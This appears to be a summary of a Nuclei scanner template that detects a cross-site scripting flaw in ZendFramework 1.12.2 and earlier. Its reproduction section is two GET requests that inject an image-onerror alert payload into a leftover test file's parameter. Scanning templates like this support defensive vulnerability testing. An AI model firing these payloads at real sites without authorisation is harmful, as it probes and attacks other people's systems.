# Nuclei Template: ZendFramework 1.12.2 - Cross-Site Scripting
**Template ID:** zend-v1-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`zend-v1-xss.yaml`)

## Vulnerability Information & PoC

## Description
ZendFramework of versions <=1.12.2 contain a cross-site scripting vulnerability via an arbitrarily supplied parameter.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/vendor/diablomedia/zendframework1-http/tests/Zend/Http/Client/_files/testRedirections.php?redirection=3&param=<img/src=x%20onerror=alert(1)>
GET {{BaseURL}}/tests/Zend/Http/Client/_files/testRedirections.php?redirection=3&param=<img/src=x%20onerror=alert(document.domain)>
```

## References
- https://twitter.com/c3l3si4n/status/1600035722148212737
